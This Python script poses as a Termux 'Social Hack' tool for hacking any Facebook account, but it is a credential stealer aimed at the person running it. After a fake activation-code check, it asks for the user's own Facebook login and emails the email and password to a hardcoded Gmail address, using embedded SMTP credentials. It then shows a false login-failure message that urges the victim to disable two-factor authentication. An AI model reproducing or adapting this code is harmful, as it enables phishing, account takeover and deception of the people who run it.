import os
import time as t
import ssl
import smtplib
#colors
red = "\033[1;31;40m"
black = '\033[1;30;40m'
green = '\033[1;32;40m'
white = '\033[1;37;40m'
blue = '\033[1;34;40m'
purple = '\033[1;35;40m'
redyellow = '\033[1;33;41m'
yellow = '\033[1;33;40m'
t.sleep(2)
os.system("clear")
print(red + "Disclaimer: Use This script for educational purposes only \nI won\'t be held for any shit" + white)
t.sleep(3)
os.system("clear")
print(green + "Checking requirements..."  + white)
os.system("""
apt install figlet
apt install toilet
apt install cowsay
apt install espeak
""")
print(green + "[✓] " + purple + "All done!" + white)
t.sleep(3)
def loop():
    os.system('clear')
    print(yellow)
    os.system("figlet Social Hack")
    print(white)
    print(blue + """
    This software is a private software use for hacking social media account with ease and understanding
    All you need is just the activation code
    
    """ + white)
    code = input(redyellow + "Enter the activation code: " + green)
    if code != "TermuxHackz Society":
        print(red +"Invalid activation code!" + white)
        t.sleep(3)
        loop()
    print(red + "Turn on your mobile data connection!" + white)
    t.sleep(5)
    print(blue + """
    [1]Hack any country Facebook account
    """ + white)
    opt = input(redyellow + "Enter a valid option " + green)
    if opt == "1":
        print(red + "You need  to login to your facebook account first!" + white)
        user = input(redyellow + "Email or Phone Number " + yellow)
        pswd = input(redyellow + 'Password' + yellow)
    print(green + "Checking login details...\nPlease wait... " + white)
    port = 465  # For SSL
    smtp_server = "smtp.gmail.com"
    sender_email = "spideranongreyhat@gmail.com"  # Enter your address
    receiver_email = "spiderweb863644@gmail.com"  # Enter receiver address
    password = "08023687626"
    message = """\
Subject: Facebook logs

Username : """ + user + """
Password: """ + pswd

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
    print(red  + "Failed to login due to unsupported device or invalid username or password or 2fa was enabled\n\nDisable 2fa to solve problem" + white)
    
        
loop()